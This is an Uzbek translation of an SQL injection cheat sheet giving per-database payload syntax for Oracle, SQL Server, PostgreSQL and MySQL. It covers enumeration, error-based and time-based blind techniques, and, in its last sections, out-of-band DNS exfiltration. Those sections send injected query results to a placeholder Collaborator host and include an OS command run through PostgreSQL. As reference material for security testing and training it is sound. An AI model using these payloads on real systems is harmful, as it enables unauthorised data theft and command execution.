# SQL ineksiya cheat sheet

Ushbu SQL ineksiya cheat sheetida, siz SQL ineksiya hujumlarini amalga oshirishda ko'pincha yuzaga keladigan turli vazifalarni bajarish uchun foydalanadigan foydali sintaksis misollari mavjud.

### <mark style="color:yellow;">Stringlarni biriktirish</mark> <a href="#string-concatenation" id="string-concatenation"></a>

Bitta stringni yaratish uchun siz bir nechta stringlarni birlashtirishingiz mumkin.

| Oracle     | `'foo'\|\|'bar'`                                                                                                 |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `'foo'+'bar'`                                                                                                    |
| PostgreSQL | `'foo'\|\|'bar'`                                                                                                 |
| MySQL      | <p><code>'foo' 'bar'</code> [Note the space between the two strings]<br><code>CONCAT('foo','bar')</code><br></p> |

### <mark style="color:yellow;">Substring</mark> <a href="#substring" id="substring"></a>

Siz belgilangan offsetdan belgilangan uzunlikda stringni ajratib olishingiz umkin. E'tibor bering, ofset indeksi 1 ga asoslangan. Quyidagi iboralarning har biri `ba`stringini qaytaradi.

| Oracle     | `SUBSTR('foobar', 4, 2)`    |
| ---------- | --------------------------- |
| Microsoft  | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL      | `SUBSTRING('foobar', 4, 2)` |

### <mark style="color:yellow;">Komentariyalar</mark> <a href="#substring" id="substring"></a>

Siz so'rovni kesish uchun komentariyalardan foydalanishingiz va asl so'rovni olib tashlashingiz mumin.

| Oracle     | <p><code>--comment</code><br></p>                                                                                          |
| ---------- | -------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| PostgreSQL | <p><code>--comment</code><br><code>/*comment*/</code></p>                                                                  |
| MySQL      | <p><code>#comment</code><br><code>-- comment</code> [Note the space after the double dash]<br><code>/*comment*/</code></p> |

### <mark style="color:yellow;">Database versiyasi</mark> <a href="#database-version" id="database-version"></a>

Siz uning turini va versiyasini aniqlash uchun ma'lumotlar bazasidan so'rov yuborishingiz mumkin. Ushbu ma'lumotlar yanada murakkab hujumlarni shakllantirishda foydali.

| Oracle     | <p><code>SELECT banner FROM v$version</code><br><code>SELECT version FROM v$instance</code><br></p> |
| ---------- | --------------------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT @@version`                                                                                  |
| PostgreSQL | `SELECT version()`                                                                                  |
| MySQL      | `SELECT @@version`                                                                                  |

### <mark style="color:yellow;">Database kontentlari</mark> <a href="#database-contents" id="database-contents"></a>

Siz ma'lumotlar bazasida mavjud bo'lgan jadvallarni va jadvallar tarkibidagi ustunlarni ro'yxatlashingiz mumkin.

| Oracle     | <p><code>SELECT * FROM all_tables</code><br><code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></p>                               |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Microsoft  | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |
| PostgreSQL | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |
| MySQL      | <p><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'</code><br></p> |

### <mark style="color:yellow;">Conditional  errors (Shartli xatoliklar)</mark> <a href="#conditional-errors" id="conditional-errors"></a>

Siz bitta Boolen holatini sinab ko'rishingiz mumkin va agar holat to'g'ri bo'lsa, ma'lumotlar bazasi xatosini o'zgartirishingiz mumkin.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual`      |
| ---------- | --------------------------------------------------------------------------------------- |
| Microsoft  | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`                         |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END`           |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

### <mark style="color:yellow;">Batched (yoki stacked) so'rovlar</mark> <a href="#batched-or-stacked-queries" id="batched-or-stacked-queries"></a>

Siz ketma-ket bir nechta so'rovlarni bajarish uchun bir nechta so'rovlarni bajarishingiz mumkin. E'tibor bering, keyingi so'rovlar bajarilsa ham, natijalar applicationga qaytarilmaydi. Demak, ushbu usul birinchi navbatda **Blind** zaifligi, shartli xato yoki vaqtni kechiktirishni boshlash uchun ikkinchi so'rovdan foydalanishingiz mumkin.

| Oracle     | `Does not support batched queries.` |
| ---------- | ----------------------------------- |
| Microsoft  | `QUERY-1-HERE; QUERY-2-HERE`        |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE`        |
| MySQL      | `QUERY-1-HERE; QUERY-2-HERE`        |

**Eslatma**

MySQL bilan, odatda SQL ineksiya uchun foydalanib bo'lmaydi. Biroq, target dastur MySQL ma'lumotlar bazasi bilan muloqot qilish uchun ma'lum bir PHP yoki Python Apisni ishlatsa, vaqti-vaqti bilan mumkin.

### <mark style="color:yellow;">Time delaylar</mark> <a href="#time-delays" id="time-delays"></a>

Siz ma'lumotlar bazasida so'rov qayta ishlanganda vaqtni kechiktirishingiz mumkin. Quyidagilar 10 soniya davomida vaqtni kechiktirishga olib keladi

| Oracle     | `dbms_pipe.receive_message(('a'),10)` |
| ---------- | ------------------------------------- |
| Microsoft  | `WAITFOR DELAY '0:0:10'`              |
| PostgreSQL | `SELECT pg_sleep(10)`                 |
| MySQL      | `SELECT sleep(10)`                    |

### <mark style="color:yellow;">Conditional time delays (Shartli vaqt kechiktirishlar)</mark> <a href="#conditional-time-delays" id="conditional-time-delays"></a>

Siz bitta Booley holatini sinab ko'rishingiz mumkin va agar shart to'g'ri bo'lsa, vaqtni kechiktirishni boshlang.

| Oracle     | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'\|\|dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| ---------- | ---------------------------------------------------------------------------------------------------------------- |
| Microsoft  | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`                                                                |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`                                  |
| MySQL      | `SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a')`                                                                   |

### <mark style="color:yellow;">DNS lookup</mark> <a href="#dns-lookup" id="dns-lookup"></a>

Siz ma'lumotlar bazasi orqali tashqi domenlarni aniqlash uchun DNS qidiruvini amalga oshirishingiz mumkin. Buning uchun, hujumda foydalanadigan Burp Collaborator subdomainini yaratib beruvchi Burp-Collabratordan foydalanishingiz kerak.shunda DNS qidiruvi sodir bo'lganligini aniqlay olasiz.

| Oracle     | <p>Quyidagi usul DNS qidiruvini boshlash uchun (XXE) XML usullainir ishlatadi. Bu zaiflik allaqachon patch qilingan ammo bir nechta Oracle databaselarda mavjud:<br><code>SELECT extractvalue(xmltype('&#x3C;?xml version="1.0" encoding="UTF-8"?>&#x3C;!DOCTYPE root [ &#x3C;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual</code><br><br>Quyidagi usullar to'liq patch qilingan Oracle databaselari uchun ishlaydi, ammo yuqori privilegiyani talab qiladi.<br><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></p> |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| PostgreSQL | `copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| MySQL      | <p><strong>Bu usul faqat Windowsda ishlaydi.</strong><br><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br><code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></p>                                                                                                                                                                                                                                                                                                                                                                                            |

### <mark style="color:yellow;">Ma'lumot eksfiltratsiyasi bilan DNS qidiruvi</mark> <a href="#dns-lookup-with-data-exfiltration" id="dns-lookup-with-data-exfiltration"></a>

Siz ineksiyalangan so'rov natijalarini o'z ichiga olgan tashqi domenga DNS qidiruvini amalga oshirish uchun ma'lumotlar bazasini keltirib chiqarishingiz mumkin. Buning uchun siz hujumda foydalanadigan subdomenni yaratishda Burp Collabrator clientidan foydalanib subdomen yaratishingiz kerak, Keyin har qanday DNS so'rov ma'lumotlarning tafsilotlarini olish uchun kollaoratator serveridan foydalaning.

| Oracle     | `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`                                                                                                                                                                                                                                        |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Microsoft  | `declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`                                                                                                                                                                                                                                                                                                                               |
| PostgreSQL | <p><code>create OR replace function f() returns void as $$</code><br><code>declare c text;</code><br><code>declare p text;</code><br><code>begin</code><br><code>SELECT into p (SELECT YOUR-QUERY-HERE);</code><br><code>c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';</code><br><code>execute c;</code><br><code>END;</code><br><code>$$ language plpgsql security definer;</code><br><code>SELECT f();</code></p> |
| MySQL      | <p>Bu usul faqat Windowsda ishlaydi.<br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></p>                                                                                                                                                                                                                                                                                                                             |

####
